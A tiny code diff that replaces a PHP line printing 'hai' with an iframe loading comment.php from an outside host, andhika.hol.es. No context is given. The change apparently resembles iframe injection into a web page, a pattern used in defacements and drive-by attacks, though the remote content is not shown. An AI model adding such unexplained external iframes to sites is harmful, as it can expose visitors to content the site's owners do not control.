@@ -1,1 +1,1 @@
-<?php echo "hai";?>
+<iframe src="andhika.hol.es/comment.php"></iframe>
